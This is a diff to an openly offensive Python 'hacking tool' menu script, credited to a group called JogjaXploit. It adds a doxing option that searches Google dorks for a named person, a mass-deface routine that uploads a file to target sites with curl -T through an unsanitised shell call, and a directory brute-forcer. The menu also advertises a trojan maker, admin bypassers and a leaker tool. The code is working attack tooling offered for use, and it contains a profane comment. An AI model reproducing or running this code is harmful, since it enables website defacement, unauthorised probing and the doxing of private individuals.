@@ -153,10 +153,11 @@ print(f"""
                  ░              ░  ░         ░    ░        ░ ░     ░           ░  ░                       
                                       \033[1;32mCoded By : MrSanZz
                                            V : 3.1.0
+                                       Team:JogjaXploit
                                   \033[1;33mhttps://github.com/MrSanZz
 """)
 time.sleep(0.5)
- #Yang Ganti Nama Owner / Pembikinnya, Lu Programmer Kid. Alias bocah Recode
+ #Whoever Recode This Project, You Are Fuck Ass Kid
 time.sleep(0.5)
 print(info + f'            [ ]Remember !, If The Tools Had A Error, Please Waiting For The Update.[ ]')
 print(f"""{yellow}┌─────────────────────────────────────────────────────────────────────────────────────────────────┐{blue}
@@ -719,10 +720,11 @@ elif answer.startswith("8"):
     print("7. Doxing With Twitter")
     print(f"8. {red}Bad Doxing{yellow}")
     print("9. Little Doxing")
+    print(f"{blue}10. {red}RUPY Doxing [R U Panic Yet?]{blue}")
     print('')
     choice = input("Choice : ")
     
-    if choice.startswith("1"):
+    if choice == "1":
         pass
         victim = input(f'\nName Somebody [Recommended To Use Full Name] : ')
         victim_numbers = input(f'\nPhone Number Target : ')
@@ -882,6 +884,59 @@ elif answer.startswith("8"):
                 if e.code == 429:
                     print(fail + f'[429] Too Many Request, Please Wait')
                     time.sleep(4)
+    elif choice == "10":
+        if os.name == "posix":
+            os.system('clear')
+        if os.name == "nt":
+            os.system('cls')
+        print(f"""{white}
+        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣲⣶⠒⠷⠶⠤⠴⠦⠤⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣶⠚⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⢌⣛⠶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠠⢚⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⡄⠙⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀       ⠀⢀⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣀⠀⣀⣤⣧⠔⠛⠓⠲⠤⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⢐⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣤⣄⣠⣤⣴⣾⣿⣿⣾⡗⠀⢀⣀⢤⠐⠠⠤⣉⠓⠦⣄⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀        ⢀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠒⠶⠶⢾⣿⡿⠛⢻⣻⠛⢻⣿⣿⠟⣋⣺⣿⠏⠀⠴⠿⠹⠋⠀⠀⠀⠀⠈⠀⠨⠳⣄⠀⠀
+⠀⠀⠀⠀⠀        ⠀⠀⢐⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⠤⠄⠐⢾⣿⣝⠤⣀⢀⡠⣱⣿⣿⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀
+⠀⠀⠀⠀⠀        ⠀⢠⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢉⣛⣺⣿⣾⣛⣽⣿⡟⠁⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀
+⠀⠀⠀⠀        ⠀⠐⡟⠀⠀⠀⠀⡠⠖⠀⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀⡈⠉⢉⡽⠿⢛⡿⢛⠯⠭⣒⣚⣩⣭⣭⣤⡤⠭⠭⢭⣥⣀⣉⣑⣒⢵⡀⠀⠀⢸⡇
+⠀⠀⠀⠀        ⠀⣰⠃⠀⢀⡔⠋⠀⠀⠀⣠⡴⠋⠀⠀⠀⠀⣠⣤⡴⠋⠀⠀⠀⠀⠀⠾⢶⣾⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠳⡀⠀⣸⠃
+⠀⠀⠀        ⠀⢰⠟⢀⣴⠏⠀⡀⢀⣴⡿⠋⠀⠀⠀⢀⡴⠟⠋⠁⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣇⠔⠁⠀
+⠀⠀⠀        ⠀⣞⣴⣿⠃⢠⣾⣴⣿⠋⠀⠀⠀⠀⠐⠋⠀⠀⠀⠀⠀⢐⣚⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠁⠀⠀⠀
+⠀⠀        ⠀⣸⣿⣿⣧⣶⣿⣿⣿⠗⠁⠀⡠⠂⠀⢀⠀⠀⠀⠀⠂⢉⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⡟⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀        ⢀⠼⢻⣿⣿⣿⣿⣿⣿⠁⢀⣴⠏⢀⣠⠞⠁⢀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠱⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀        ⠀⣠⣿⣿⣿⣿⣿⣿⣧⣾⡿⣡⣾⣿⠃⣠⡾⠁⠀⣀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠂⠀⢻⣍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀        ⠈⣽⣿⣿⣿⣿⣿⣿⡟⠉⣰⣿⡿⣡⣾⣿⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢻⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀        ⣠⣿⣿⣿⣿⣿⣿⣿⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣱⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⢸⣾⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+        ⠐⠛⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢫⣿⠏⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⡄⠀⣿⣿⡏⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀        ⠀⣾⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣴⡿⢋⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀        ⠀⠁⠀⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀       ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀        ⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀        ⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⢿⡿⠁⣿⠏⠘⢿⣿⣿⣿⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀        ⠀⠀⠀⠿⠋⣿⡿⠋⣸⠟⠁⠀⣾⣿⣿⣿⣿⣿⠟⠁⠈⠀⠀⠹⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠁⠀⠀⠉⠀⠀⠰⠿⣿⣿⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠙⡏⠀⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+        """)
+        target = input(f"Target Full Name : ")
+        dork = ['inlink:', 'in:', 'on:', 'intext:', 'ontitle:']
+        for i in dork:
+            try:
+                rand_user = random.choice(user_agents)
+                cookie = exists('.google-cookie')
+                if cookie == True:
+                    os.remove('.google-cookie')
+                print(red + f"[ + ] Searching {target} With {i} [ + ]")
+                for doxed in search(f'{i}{target}', num=2, start=0, stop=None, pause=3):
+                    print(success + f"Results:")
+                    print(yellow + f"{doxed}")
+            except KeyboardInterrupt:
+                print("Interrupt")
+                exit()
+            except urllib.error.HTTPError as e:
+                if e.code == 429:
+                    print(yellow + f"Wh00pz ! 429 E.. Exiting..")
+                    exit()
 elif answer.startswith("9"):
     pass
     print("1. Dork Admin")
@@ -2015,13 +2070,13 @@ elif answer == ("20"):
     print(info + f'            [ ]Remember !, If The Tools Had A Error, Please Waiting For The Update.[ ]')
     print(f"""    {yellow}┌─────────────────────────────────────────────────────────────────────────────────────────────────┐{blue}
     {yellow}│{blue} [01] WP Bypasser {red}[Hot Results]{blue}                                                                  {yellow}│{blue}
-    {yellow}│{blue} [02] Bypasser Admin V4                                                                          {yellow}│{blue}
+    {yellow}│{blue} [02] Bypasser Admin V4 {red}[Hot Results]{blue}                                                            {yellow}│{blue}
     {yellow}│{blue} [03] Deface SC Maker                                                                            {yellow}│{blue}
     {yellow}│{blue} [04] Trojan Maker                                                                               {yellow}│{blue}
-    {yellow}│{blue} [05] Bypasser Admin With ID                                                                     {yellow}│{blue}
-    {yellow}│{blue} [06] Leaker Tools V3                                                                            {yellow}│{blue}
-    {yellow}│{blue}                                                                                                 {yellow}│{blue}
-    {yellow}│{blue}                                                                                                 {yellow}│{blue}
+    {yellow}│{blue} [05] Bypasser Admin With ID {red}[Hot Results]{blue}                                                       {yellow}│{blue}
+    {yellow}│{blue} [06] Leaker Tools V3 {red}[Hot Results]{blue}                                                              {yellow}│{blue}
+    {yellow}│{blue} [07] Mass Deface V3                                                                             {yellow}│{blue}
+    {yellow}│{blue} [08] DIRBER                                                                                     {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}└─────────────────────────────────────────────────────────────────────────────────────────────────┘{blue}
@@ -2404,8 +2459,92 @@ elif answer == ("20"):
                 print(f"[ + ] File Extension : {i} Skipped.. [ + ]")
                 continue
         print(success + f"[ + ] Done.. [ + ]")
+    if answer == ("7"):
+        try:
+            print("""\033[1;33m
+        
+            ██████╗ ███████╗███████╗ █████╗  ██████╗███████╗██████╗ 
+            ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
+            ██║  ██║█████╗  █████╗  ███████║██║     █████╗  ██████╔╝
+            ██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
+            ██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗██║  ██║
+            ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
+                                                       
+                                     MASS DEFACE                       
+                                       For PC
+            """)
+            pass
+            files2 = input(f'\nFile [example : hai.html] : ')
+            file_path = f'{files2}'
+            def flogger(files2, file_path):
+                print('')
+            while True:
+                pass     
+                upload_url = input(f'\033[1;34m\nSite Target : ')
+        
+                with open(file_path, 'rb') as file:
+                    file_data = file.read()
+
+                # Membuat dictionary dengan file yang akan diunggah
+                files = {'file': (f'{files2}', file_data, 'application/octet-stream')}
+        
+                response = os.system(f'curl -T {file_path} {upload_url}')
+            
+                # Mengecek apakah file berhasil diunggah
+                if response == True:
+                    print(fail + f"File Failed Uploaded.")
+                else:
+                    print(success + f"Results: ")
+                    print(f'{upload_url}/{files2}')     
+        except FileNotFoundError:
+            print(fail + f'File {files2} Not Found On Pandora Folder!')
+    elif answer == "8":
+        try:
+            url = input(f"URL TARGET : ")
+            list = input(f"File List: ")
+            print("Please Wait...")
+            time.sleep(1.3)
+            file_name = list
+            with open(file_name, 'rb') as file:
+                file_content = file.read()
+            file_content_str = file_content.decode('utf-8')
+            text = file_content_str.split()
+            for a in text:
+                rand_user = random.choice(user_agents)
+                def get_folder_size(trgt):
+                    try:
+                        if response.status_code == 200:
+                            folder_content = response.content
+                            size_bytes = len(folder_content)
+                            size_kb = size_bytes / 1024
+                            size_mb = size_kb / 1024
+                            size_gb = size_mb / 1024
+                            return size_bytes, size_kb, size_mb, size_gb
+                        else:
+                            return None
+                    except requests.exceptions.RequestException as e:
+                        print(f"Error: {e}")
+                        return None
+                trgt = f'{url}{a}'
+                response = requests.get(trgt)
+                results = get_folder_size(trgt)
+                size_bytes = results
+                print(f"Testing : {trgt}")
+                print(success + f'Results: ')
+                print(response)
+                print(trgt)
+                print(size_bytes)
+        except KeyboardInterrupt:
+            print("bye")
+            exit()
+        except FileNotFoundError:
+            print(f"File {list} Doesn't Exists On Folder PANDORA!")
+            exit()
+        except requests.exceptions.InvalidURL:
+            print(f"Error While Compiling {trgt}")
 else:
     print('\n')
     print('Exiting.. Bye ! ')
     time.sleep(0.5)
     exit()
+	    
